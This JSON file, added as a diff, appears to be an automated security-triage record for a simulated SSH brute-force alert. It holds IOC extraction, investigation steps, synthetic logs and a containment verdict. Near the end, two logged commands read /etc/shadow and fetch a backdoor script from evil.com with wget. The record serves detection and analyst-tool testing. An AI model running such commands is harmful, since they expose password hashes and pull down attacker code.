@@ -1,0 +1,788 @@
+{
+  "alert_id": "ALT-2024-002",
+  "iocs": {
+    "alert_id": "ALT-2024-002",
+    "iocs": [
+      {
+        "ioc_type": "ipv4",
+        "value": "40.80.148.42",
+        "context": "alert_ALT-2024-002"
+      },
+      {
+        "ioc_type": "ipv4",
+        "value": "192.168.250.50",
+        "context": "alert_ALT-2024-002"
+      }
+    ],
+    "extraction_timestamp": "2026-08-20T21:26:26.674150Z"
+  },
+  "steps": [
+    {
+      "step_number": 1,
+      "action": "Extract Indicators of Compromise (IOCs)",
+      "reasoning": "Extract all atomic observables (IPs, domains, hashes, users, hosts) from raw alert payload",
+      "tool_used": "extract_iocs",
+      "query": "content={\"src_ip\": \"40.80.148.42\", \"dest_ip\": \"192.168.250.50\", \"dest_port\": 22, \"event_...",
+      "result_summary": "Extracted 2 IOCs: 2 IPs, 0 hashes, 0 users, 0 domains.",
+      "events_found": 2,
+      "timestamp": "2026-08-20T21:26:26.674175Z"
+    },
+    {
+      "step_number": 2,
+      "action": "Query network and perimeter telemetry for source IP '40.80.148.42'",
+      "reasoning": "Determine whether inbound/outbound connection volume, targeted ports, or IDS signatures indicate malicious probing",
+      "tool_used": "query_logs",
+      "query": "src_ip=40.80.148.42, scenario_id=scenario_02_brute_force",
+      "result_summary": "Identified 31 matching network/IDS telemetry events.",
+      "events_found": 31,
+      "timestamp": "2026-08-20T21:26:26.676570Z"
+    },
+    {
+      "step_number": 3,
+      "action": "Query authentication and endpoint activity for user 'None' and host 'None'",
+      "reasoning": "Assess whether user account suffered brute forcing, unauthorized privilege escalation, or executed suspicious processes",
+      "tool_used": "query_logs",
+      "query": "user=None, host=None, scenario_id=scenario_02_brute_force",
+      "result_summary": "Retrieved 33 authentication/endpoint events.",
+      "events_found": 33,
+      "timestamp": "2026-08-20T21:26:26.679739Z"
+    },
+    {
+      "step_number": 4,
+      "action": "Cross-source temporal correlation and attack pattern reconstruction",
+      "reasoning": "Synthesize event timeline across perimeter, authentication, and endpoint telemetry to identify multi-stage attack patterns",
+      "tool_used": "correlate_events",
+      "query": "scenario_id=scenario_02_brute_force, target_ip=40.80.148.42",
+      "result_summary": "Correlated 33 events. Detected 1 attack pattern(s): ['brute_force_followed_by_success'].",
+      "events_found": 1,
+      "timestamp": "2026-08-20T21:26:26.681092Z"
+    },
+    {
+      "step_number": 5,
+      "action": "Query Threat Intelligence feeds for all extracted external IOCs",
+      "reasoning": "Validate external indicators against known C2 servers, vulnerability scanners, and malicious hash feeds",
+      "tool_used": "lookup_threat_intel",
+      "query": "IOCs: ['40.80.148.42', '192.168.250.50']",
+      "result_summary": "Evaluated 2 indicators. Malicious tags found: [['apt', 'brute-force', 'po1s0n1vy']].",
+      "events_found": 1,
+      "timestamp": "2026-08-20T21:26:26.681601Z"
+    },
+    {
+      "step_number": 6,
+      "action": "Synthesize final investigation verdict and containment action",
+      "reasoning": "Weigh threat intel confidence, correlation patterns, and administrative context to assign verdict",
+      "tool_used": "investigation_synthesis",
+      "query": "Analytical evaluation",
+      "result_summary": "Verdict: TRUE_POSITIVE | Recommended Action: CONTAIN",
+      "events_found": 1,
+      "timestamp": "2026-08-20T21:26:26.681677Z"
+    }
+  ],
+  "log_events": [
+    {
+      "id": "98b8f3a8-89be-4b47-b2ec-fabade900e4f",
+      "timestamp": "2024-08-11T03:15:00",
+      "source_type": "auth",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": null,
+      "dest_port": 22,
+      "user": "admin",
+      "host": "srv-dc01",
+      "action": "login_failed",
+      "raw_event": "sshd[2100]: Failed password for admin from 40.80.148.42 port 50000 ssh2",
+      "metadata": {
+        "event_id": 4625,
+        "logon_type": 10,
+        "failure_reason": "bad_password",
+        "service": "sshd"
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "0ee6ff3f-b32e-44d6-b6cc-9feb0cbecc8e",
+      "timestamp": "2024-08-11T03:15:00",
+      "source_type": "firewall",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": 50000,
+      "dest_port": 22,
+      "user": "",
+      "host": "fw-01",
+      "action": "allow",
+      "raw_event": "id=firewall action=allow srcip=40.80.148.42 dstip=192.168.250.50 dstport=22 proto=tcp",
+      "metadata": {
+        "protocol": "tcp",
+        "bytes_sent": 380,
+        "bytes_received": 120
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "ee1c9935-b279-4964-a6f6-afc04d9e1646",
+      "timestamp": "2024-08-11T03:15:12",
+      "source_type": "auth",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": null,
+      "dest_port": 22,
+      "user": "root",
+      "host": "srv-dc01",
+      "action": "login_failed",
+      "raw_event": "sshd[2101]: Failed password for root from 40.80.148.42 port 50001 ssh2",
+      "metadata": {
+        "event_id": 4625,
+        "logon_type": 10,
+        "failure_reason": "bad_password",
+        "service": "sshd"
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "606d925c-1e16-4a30-857e-6de68a29d8f9",
+      "timestamp": "2024-08-11T03:15:12",
+      "source_type": "firewall",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": 50001,
+      "dest_port": 22,
+      "user": "",
+      "host": "fw-01",
+      "action": "allow",
+      "raw_event": "id=firewall action=allow srcip=40.80.148.42 dstip=192.168.250.50 dstport=22 proto=tcp",
+      "metadata": {
+        "protocol": "tcp",
+        "bytes_sent": 380,
+        "bytes_received": 120
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "9b62273b-6c67-4471-b818-6e5bae1aeaab",
+      "timestamp": "2024-08-11T03:15:24",
+      "source_type": "auth",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": null,
+      "dest_port": 22,
+      "user": "administrator",
+      "host": "srv-dc01",
+      "action": "login_failed",
+      "raw_event": "sshd[2102]: Failed password for administrator from 40.80.148.42 port 50002 ssh2",
+      "metadata": {
+        "event_id": 4625,
+        "logon_type": 10,
+        "failure_reason": "bad_password",
+        "service": "sshd"
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "e9a1a972-229c-40fd-a169-7e0ccd14a589",
+      "timestamp": "2024-08-11T03:15:24",
+      "source_type": "firewall",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": 50002,
+      "dest_port": 22,
+      "user": "",
+      "host": "fw-01",
+      "action": "allow",
+      "raw_event": "id=firewall action=allow srcip=40.80.148.42 dstip=192.168.250.50 dstport=22 proto=tcp",
+      "metadata": {
+        "protocol": "tcp",
+        "bytes_sent": 380,
+        "bytes_received": 120
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "e02649c6-cce8-47e0-bb49-3287f1d30930",
+      "timestamp": "2024-08-11T03:15:36",
+      "source_type": "auth",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": null,
+      "dest_port": 22,
+      "user": "admin",
+      "host": "srv-dc01",
+      "action": "login_failed",
+      "raw_event": "sshd[2103]: Failed password for admin from 40.80.148.42 port 50003 ssh2",
+      "metadata": {
+        "event_id": 4625,
+        "logon_type": 10,
+        "failure_reason": "bad_password",
+        "service": "sshd"
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "174cb785-81d5-4a75-9dd9-90996991bacb",
+      "timestamp": "2024-08-11T03:15:36",
+      "source_type": "firewall",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": 50003,
+      "dest_port": 22,
+      "user": "",
+      "host": "fw-01",
+      "action": "allow",
+      "raw_event": "id=firewall action=allow srcip=40.80.148.42 dstip=192.168.250.50 dstport=22 proto=tcp",
+      "metadata": {
+        "protocol": "tcp",
+        "bytes_sent": 380,
+        "bytes_received": 120
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "b04b96f5-27c7-47ac-815c-8585fd14d404",
+      "timestamp": "2024-08-11T03:15:48",
+      "source_type": "auth",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": null,
+      "dest_port": 22,
+      "user": "root",
+      "host": "srv-dc01",
+      "action": "login_failed",
+      "raw_event": "sshd[2104]: Failed password for root from 40.80.148.42 port 50004 ssh2",
+      "metadata": {
+        "event_id": 4625,
+        "logon_type": 10,
+        "failure_reason": "bad_password",
+        "service": "sshd"
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "337ec407-0ffe-4565-a90b-0d8b8f1326f6",
+      "timestamp": "2024-08-11T03:15:48",
+      "source_type": "firewall",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": 50004,
+      "dest_port": 22,
+      "user": "",
+      "host": "fw-01",
+      "action": "allow",
+      "raw_event": "id=firewall action=allow srcip=40.80.148.42 dstip=192.168.250.50 dstport=22 proto=tcp",
+      "metadata": {
+        "protocol": "tcp",
+        "bytes_sent": 380,
+        "bytes_received": 120
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "7f308f1e-7f0e-44ca-b310-11c2807cc17a",
+      "timestamp": "2024-08-11T03:16:00",
+      "source_type": "auth",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": null,
+      "dest_port": 22,
+      "user": "administrator",
+      "host": "srv-dc01",
+      "action": "login_failed",
+      "raw_event": "sshd[2105]: Failed password for administrator from 40.80.148.42 port 50005 ssh2",
+      "metadata": {
+        "event_id": 4625,
+        "logon_type": 10,
+        "failure_reason": "bad_password",
+        "service": "sshd"
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "1b592157-b37b-44fd-9e65-41875a13d069",
+      "timestamp": "2024-08-11T03:16:00",
+      "source_type": "firewall",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": 50005,
+      "dest_port": 22,
+      "user": "",
+      "host": "fw-01",
+      "action": "allow",
+      "raw_event": "id=firewall action=allow srcip=40.80.148.42 dstip=192.168.250.50 dstport=22 proto=tcp",
+      "metadata": {
+        "protocol": "tcp",
+        "bytes_sent": 380,
+        "bytes_received": 120
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "2b1410ba-a094-433c-9574-bea0fa042d09",
+      "timestamp": "2024-08-11T03:16:12",
+      "source_type": "auth",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": null,
+      "dest_port": 22,
+      "user": "admin",
+      "host": "srv-dc01",
+      "action": "login_failed",
+      "raw_event": "sshd[2106]: Failed password for admin from 40.80.148.42 port 50006 ssh2",
+      "metadata": {
+        "event_id": 4625,
+        "logon_type": 10,
+        "failure_reason": "bad_password",
+        "service": "sshd"
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "5a32df5d-a28a-420e-ad6a-550b7ff34a2b",
+      "timestamp": "2024-08-11T03:16:12",
+      "source_type": "firewall",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": 50006,
+      "dest_port": 22,
+      "user": "",
+      "host": "fw-01",
+      "action": "allow",
+      "raw_event": "id=firewall action=allow srcip=40.80.148.42 dstip=192.168.250.50 dstport=22 proto=tcp",
+      "metadata": {
+        "protocol": "tcp",
+        "bytes_sent": 380,
+        "bytes_received": 120
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "a817579f-7fa4-416e-96d7-e7077937d818",
+      "timestamp": "2024-08-11T03:16:24",
+      "source_type": "auth",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": null,
+      "dest_port": 22,
+      "user": "root",
+      "host": "srv-dc01",
+      "action": "login_failed",
+      "raw_event": "sshd[2107]: Failed password for root from 40.80.148.42 port 50007 ssh2",
+      "metadata": {
+        "event_id": 4625,
+        "logon_type": 10,
+        "failure_reason": "bad_password",
+        "service": "sshd"
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "604b119d-4752-44d9-b369-804df302295a",
+      "timestamp": "2024-08-11T03:16:24",
+      "source_type": "firewall",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": 50007,
+      "dest_port": 22,
+      "user": "",
+      "host": "fw-01",
+      "action": "allow",
+      "raw_event": "id=firewall action=allow srcip=40.80.148.42 dstip=192.168.250.50 dstport=22 proto=tcp",
+      "metadata": {
+        "protocol": "tcp",
+        "bytes_sent": 380,
+        "bytes_received": 120
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "f5e49c86-1377-4f8f-ac49-c087d06be02b",
+      "timestamp": "2024-08-11T03:16:36",
+      "source_type": "auth",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": null,
+      "dest_port": 22,
+      "user": "administrator",
+      "host": "srv-dc01",
+      "action": "login_failed",
+      "raw_event": "sshd[2108]: Failed password for administrator from 40.80.148.42 port 50008 ssh2",
+      "metadata": {
+        "event_id": 4625,
+        "logon_type": 10,
+        "failure_reason": "bad_password",
+        "service": "sshd"
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "bfeceb56-af87-42b3-a26e-56ab6b490943",
+      "timestamp": "2024-08-11T03:16:36",
+      "source_type": "firewall",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": 50008,
+      "dest_port": 22,
+      "user": "",
+      "host": "fw-01",
+      "action": "allow",
+      "raw_event": "id=firewall action=allow srcip=40.80.148.42 dstip=192.168.250.50 dstport=22 proto=tcp",
+      "metadata": {
+        "protocol": "tcp",
+        "bytes_sent": 380,
+        "bytes_received": 120
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "c0be81f0-48f6-4df6-b12a-7e728d7c3ab4",
+      "timestamp": "2024-08-11T03:16:48",
+      "source_type": "auth",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": null,
+      "dest_port": 22,
+      "user": "admin",
+      "host": "srv-dc01",
+      "action": "login_failed",
+      "raw_event": "sshd[2109]: Failed password for admin from 40.80.148.42 port 50009 ssh2",
+      "metadata": {
+        "event_id": 4625,
+        "logon_type": 10,
+        "failure_reason": "bad_password",
+        "service": "sshd"
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "7597ef44-dbc5-4be4-81ec-8c3608cf9187",
+      "timestamp": "2024-08-11T03:16:48",
+      "source_type": "firewall",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": 50009,
+      "dest_port": 22,
+      "user": "",
+      "host": "fw-01",
+      "action": "allow",
+      "raw_event": "id=firewall action=allow srcip=40.80.148.42 dstip=192.168.250.50 dstport=22 proto=tcp",
+      "metadata": {
+        "protocol": "tcp",
+        "bytes_sent": 380,
+        "bytes_received": 120
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "193b4f2b-5265-406b-8268-24001a683205",
+      "timestamp": "2024-08-11T03:17:00",
+      "source_type": "auth",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": null,
+      "dest_port": 22,
+      "user": "root",
+      "host": "srv-dc01",
+      "action": "login_failed",
+      "raw_event": "sshd[2110]: Failed password for root from 40.80.148.42 port 50010 ssh2",
+      "metadata": {
+        "event_id": 4625,
+        "logon_type": 10,
+        "failure_reason": "bad_password",
+        "service": "sshd"
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "1cd6ae52-3deb-4213-9bfd-d0547de4086c",
+      "timestamp": "2024-08-11T03:17:00",
+      "source_type": "firewall",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": 50010,
+      "dest_port": 22,
+      "user": "",
+      "host": "fw-01",
+      "action": "allow",
+      "raw_event": "id=firewall action=allow srcip=40.80.148.42 dstip=192.168.250.50 dstport=22 proto=tcp",
+      "metadata": {
+        "protocol": "tcp",
+        "bytes_sent": 380,
+        "bytes_received": 120
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "ef037535-2c75-41be-95dc-22b288f6a0f6",
+      "timestamp": "2024-08-11T03:17:12",
+      "source_type": "auth",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": null,
+      "dest_port": 22,
+      "user": "administrator",
+      "host": "srv-dc01",
+      "action": "login_failed",
+      "raw_event": "sshd[2111]: Failed password for administrator from 40.80.148.42 port 50011 ssh2",
+      "metadata": {
+        "event_id": 4625,
+        "logon_type": 10,
+        "failure_reason": "bad_password",
+        "service": "sshd"
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "ca7b1ddf-88a6-4ec0-a815-749b00674ae4",
+      "timestamp": "2024-08-11T03:17:12",
+      "source_type": "firewall",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": 50011,
+      "dest_port": 22,
+      "user": "",
+      "host": "fw-01",
+      "action": "allow",
+      "raw_event": "id=firewall action=allow srcip=40.80.148.42 dstip=192.168.250.50 dstport=22 proto=tcp",
+      "metadata": {
+        "protocol": "tcp",
+        "bytes_sent": 380,
+        "bytes_received": 120
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "ed1c06fe-fae4-4434-9440-3050a01105a3",
+      "timestamp": "2024-08-11T03:17:24",
+      "source_type": "auth",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": null,
+      "dest_port": 22,
+      "user": "admin",
+      "host": "srv-dc01",
+      "action": "login_failed",
+      "raw_event": "sshd[2112]: Failed password for admin from 40.80.148.42 port 50012 ssh2",
+      "metadata": {
+        "event_id": 4625,
+        "logon_type": 10,
+        "failure_reason": "bad_password",
+        "service": "sshd"
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "6aa731a9-ca40-4a86-9e71-e968fed9fa52",
+      "timestamp": "2024-08-11T03:17:24",
+      "source_type": "firewall",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": 50012,
+      "dest_port": 22,
+      "user": "",
+      "host": "fw-01",
+      "action": "allow",
+      "raw_event": "id=firewall action=allow srcip=40.80.148.42 dstip=192.168.250.50 dstport=22 proto=tcp",
+      "metadata": {
+        "protocol": "tcp",
+        "bytes_sent": 380,
+        "bytes_received": 120
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "3b73ead4-fe1d-490c-8a67-c8a2dc13a531",
+      "timestamp": "2024-08-11T03:17:36",
+      "source_type": "auth",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": null,
+      "dest_port": 22,
+      "user": "root",
+      "host": "srv-dc01",
+      "action": "login_failed",
+      "raw_event": "sshd[2113]: Failed password for root from 40.80.148.42 port 50013 ssh2",
+      "metadata": {
+        "event_id": 4625,
+        "logon_type": 10,
+        "failure_reason": "bad_password",
+        "service": "sshd"
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "84af18a0-346f-40c3-935a-a1ca66f55e2f",
+      "timestamp": "2024-08-11T03:17:36",
+      "source_type": "firewall",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": 50013,
+      "dest_port": 22,
+      "user": "",
+      "host": "fw-01",
+      "action": "allow",
+      "raw_event": "id=firewall action=allow srcip=40.80.148.42 dstip=192.168.250.50 dstport=22 proto=tcp",
+      "metadata": {
+        "protocol": "tcp",
+        "bytes_sent": 380,
+        "bytes_received": 120
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "bfb2bf98-cb5d-48a8-8574-141fd49471b7",
+      "timestamp": "2024-08-11T03:17:48",
+      "source_type": "auth",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": null,
+      "dest_port": 22,
+      "user": "administrator",
+      "host": "srv-dc01",
+      "action": "login_failed",
+      "raw_event": "sshd[2114]: Failed password for administrator from 40.80.148.42 port 50014 ssh2",
+      "metadata": {
+        "event_id": 4625,
+        "logon_type": 10,
+        "failure_reason": "bad_password",
+        "service": "sshd"
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "39df1b3d-470f-489f-9351-bbf11d9ff0d6",
+      "timestamp": "2024-08-11T03:17:48",
+      "source_type": "firewall",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": 50014,
+      "dest_port": 22,
+      "user": "",
+      "host": "fw-01",
+      "action": "allow",
+      "raw_event": "id=firewall action=allow srcip=40.80.148.42 dstip=192.168.250.50 dstport=22 proto=tcp",
+      "metadata": {
+        "protocol": "tcp",
+        "bytes_sent": 380,
+        "bytes_received": 120
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "c6052b23-e12f-4e7b-a963-097e799370e8",
+      "timestamp": "2024-08-11T03:18:05",
+      "source_type": "auth",
+      "src_ip": "40.80.148.42",
+      "dest_ip": "192.168.250.50",
+      "src_port": null,
+      "dest_port": 22,
+      "user": "admin",
+      "host": "srv-dc01",
+      "action": "login_success",
+      "raw_event": "sshd[2120]: Accepted password for admin from 40.80.148.42 port 50020 ssh2",
+      "metadata": {
+        "event_id": 4624,
+        "logon_type": 10,
+        "service": "sshd"
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "8be22722-37a8-4538-8899-53942eedd96b",
+      "timestamp": "2024-08-11T03:18:30",
+      "source_type": "endpoint",
+      "src_ip": "",
+      "dest_ip": "",
+      "src_port": null,
+      "dest_port": null,
+      "user": "admin",
+      "host": "srv-dc01",
+      "action": "process_create",
+      "raw_event": "Process Create: /bin/bash -c 'cat /etc/shadow', Parent: sshd, User: admin",
+      "metadata": {
+        "process_name": "/bin/bash",
+        "command_line": "cat /etc/shadow",
+        "parent_process": "sshd",
+        "event_id": 1
+      },
+      "scenario_id": "scenario_02_brute_force"
+    },
+    {
+      "id": "2c457476-dd99-44cd-a897-53d8a20f3087",
+      "timestamp": "2024-08-11T03:19:00",
+      "source_type": "endpoint",
+      "src_ip": "",
+      "dest_ip": "",
+      "src_port": null,
+      "dest_port": null,
+      "user": "admin",
+      "host": "srv-dc01",
+      "action": "process_create",
+      "raw_event": "Process Create: /usr/bin/wget http://evil.com/backdoor.sh, Parent: bash, User: admin",
+      "metadata": {
+        "process_name": "wget",
+        "command_line": "wget http://evil.com/backdoor.sh",
+        "parent_process": "bash",
+        "event_id": 1
+      },
+      "scenario_id": "scenario_02_brute_force"
+    }
+  ],
+  "correlations": [
+    {
+      "description": "15 failed authentications followed by successful login for user 'admin' from 40.80.148.42",
+      "events": [],
+      "pattern": "brute_force_followed_by_success",
+      "confidence": 0.7
+    }
+  ],
+  "threat_intel": [
+    {
+      "ioc_value": "40.80.148.42",
+      "ioc_type": "ipv4",
+      "reputation": "malicious",
+      "confidence": 0.99,
+      "tags": [
+        "apt",
+        "brute-force",
+        "po1s0n1vy"
+      ],
+      "source": "local_known_iocs",
+      "raw_response": {
+        "reputation": "malicious",
+        "confidence": 0.99,
+        "tags": [
+          "apt",
+          "brute-force",
+          "po1s0n1vy"
+        ],
+        "first_seen": "2024-08-11",
+        "description": "IP associée au groupe hacktiviste po1s0n1vy — brute force SSH",
+        "references": [
+          "BOTS v1 po1s0n1vy campaign"
+        ]
+      }
+    },
+    {
+      "ioc_value": "192.168.250.50",
+      "ioc_type": "ipv4",
+      "reputation": "clean",
+      "confidence": 0.99,
+      "tags": [
+        "internal",
+        "domain-controller"
+      ],
+      "source": "local_known_iocs",
+      "raw_response": {
+        "reputation": "clean",
+        "confidence": 0.99,
+        "tags": [
+          "internal",
+          "domain-controller"
+        ],
+        "description": "Contrôleur de domaine Active Directory (srv-dc01)"
+      }
+    }
+  ],
+  "severity_score": null,
+  "verdict": "true_positive",
+  "recommended_action": "contain",
+  "started_at": "2026-08-20T21:26:26.672983Z",
+  "completed_at": "2026-08-20T21:26:26.681745Z"
+}
